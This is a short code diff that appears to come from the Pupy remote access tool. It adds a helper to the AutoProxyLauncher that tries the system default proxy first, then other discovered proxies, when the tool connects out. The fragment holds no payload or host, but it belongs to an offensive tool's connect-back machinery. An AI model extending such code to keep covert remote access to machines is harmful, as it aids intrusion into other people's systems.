@@ -11,9 +11,18 @@ from network.lib import utils
 
 from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
 from ..clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
-from ..proxies import get_proxies
+from ..proxies import get_proxies, find_default_proxy
 
 import logging
+
+def find_proxies(additional_proxies=None):
+    proxy_info = find_default_proxy()
+    if proxy_info:
+        yield proxy_info
+
+    for proxy_info in get_proxies(additional_proxies=additional_proxies):
+        if proxy_info:
+            yield proxy_info
 
 class AutoProxyLauncher(BaseLauncher):
     """
@@ -104,7 +113,7 @@ class AutoProxyLauncher(BaseLauncher):
                 logging.error(e)
 
         #then with proxies
-        for proxy_type, proxy, proxy_username, proxy_password in get_proxies(
+        for proxy_type, proxy, proxy_username, proxy_password in find_proxies(
                 additional_proxies=self.args.add_proxy
             ):
             try:
